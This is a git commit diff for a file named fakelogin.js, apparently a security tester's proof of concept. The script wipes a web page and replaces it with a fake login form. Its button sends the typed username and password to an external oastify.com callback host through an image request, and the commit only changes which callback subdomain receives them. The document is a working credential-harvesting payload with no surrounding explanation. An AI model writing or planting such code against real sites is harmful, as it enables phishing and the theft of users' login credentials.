3f07870c76a68a3fd48a286d76bb0bbc6e891ffd
Inspector72 <donnis@inspectiv.com>
2025-12-01 11:49:30 -0600

    Update fakelogin.js

--- fakelogin.js
+++ fakelogin.js
@@ -2,7 +2,7 @@ window.onload = () => {
   document.body.innerHTML = `
     <input id="u">
     <input id="p" type="password">
-    <button onclick="(new Image()).src='https://vjihl4fa5lzu21wd2ii6kd3fd6jy7pve.oastify.com?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">
+    <button onclick="(new Image()).src='https://d9n096s0okktbxt3qwamiyg9j0prdh16.oastify.com?u='+encodeURIComponent(u.value)+'&p='+encodeURIComponent(p.value)">
       Send
     </button>
   `;
